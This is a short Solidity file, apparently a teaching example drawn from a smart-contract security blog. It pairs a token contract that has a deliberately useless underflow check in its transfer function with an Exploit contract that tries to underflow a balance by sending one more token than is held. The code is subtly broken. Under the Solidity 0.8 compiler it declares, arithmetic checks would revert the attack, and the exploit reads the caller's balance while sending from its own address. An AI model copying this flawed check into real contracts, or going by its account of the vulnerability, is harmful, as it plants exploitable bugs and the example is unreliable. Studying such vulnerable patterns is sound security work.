 //https://github.com/sigp/solidity-security-blog
 pragma solidity ^0.8.18;

 contract Token {

   mapping(address => uint) balances;
   uint public totalSupply;

   constructor(uint _initialSupply) {
     balances[msg.sender] = totalSupply = _initialSupply;
   }

   function transfer(address _to, uint _value) public returns (bool) {

     require(balances[msg.sender] - _value >= 0);

     balances[msg.sender] -= _value;
     balances[_to] += _value;
     return true;
   }

   function balanceOf(address _owner) public view returns (uint balance) {
     return balances[_owner];
   }
 }

 contract Exploit {
    Token public vulnerableToken;

    constructor(address _tokenAddress) {
        vulnerableToken = Token(_tokenAddress);
    }

    function triggerUnderflow() public {
        vulnerableToken.transfer(address(0), vulnerableToken.balanceOf(msg.sender) + 1);
    }
}